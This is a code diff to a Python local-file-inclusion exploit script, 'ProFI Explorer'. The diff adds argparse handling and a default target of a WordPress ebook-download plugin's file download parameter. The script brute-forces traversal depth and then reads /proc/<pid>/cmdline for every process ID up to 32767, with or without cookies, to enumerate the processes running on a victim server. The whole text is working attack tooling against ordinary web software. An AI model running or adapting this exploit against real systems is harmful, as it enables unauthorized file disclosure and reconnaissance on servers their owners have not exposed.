@@ -5,9 +5,10 @@ import sys
 import re
 import argparse
 
-#parser=argparse.ArgumentParser(
-#	description='''LFI Script to Ouput System Processes. ''')
-#args=parser.parse_args()
+parser = argparse.ArgumentParser()
+#description=
+parser.add_argument('-u', '--url', default='http://127.0.0.1/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=', required=True)
+args=parser.parse_args()
 
 class bcolours:
     GREEN = '\033[92m'
@@ -15,7 +16,7 @@ class bcolours:
     ENDC = '\033[0m'	
 
 max_depth = 7
-base_url = sys.argv[1]
+base_url = args.url
 default_process = "proc/1/cmdline"
 target_depth = 0
 target_content = ""
@@ -30,7 +31,7 @@ for depth in range(max_depth):
 	if process_status == str(200):
 		target_depth = depth
 		target_content = process_content
-		target_address = sys.argv[1]+("xx/" * depth)+"proc/(x)/cmdline"
+		target_address = args.url+("xx/" * depth)+"proc/(x)/cmdline"
 		break
 
 print(bcolours.WARNING + "[*]" + bcolours.ENDC + " ProFI Explorer (v0.1b)")
@@ -50,7 +51,7 @@ if cookie_request == "y":
 	print(cookies)
 	print(bcolours.WARNING + "[*]" + bcolours.ENDC + " Currently Scanning: " + target_address + "\n")
 	for x in range(0,32767):
-		request_address = sys.argv[1]+("xx/" * depth)+"proc/"+str(x)+"/cmdline"
+		request_address = args.url+("xx/" * depth)+"proc/"+str(x)+"/cmdline"
 		#print(request_address)
 		#request_response = requests.get(request_address, cookies=cookie_jar)
 		request_response = requests.get(request_address, cookies=cookies)
@@ -64,7 +65,7 @@ if cookie_request == "y":
 else:
 	print(bcolours.WARNING + "[*]" + bcolours.ENDC + " Currently Scanning: " + target_address + "\n")
 	for x in range(0,32767):
-		request_address = sys.argv[1]+("xx/" * depth)+"proc/"+str(x)+"/cmdline"
+		request_address = args.url+("xx/" * depth)+"proc/"+str(x)+"/cmdline"
 		#print(request_address)
 		request_response = requests.get(request_address)
 		request_content = str(request_response.content,'utf-8')
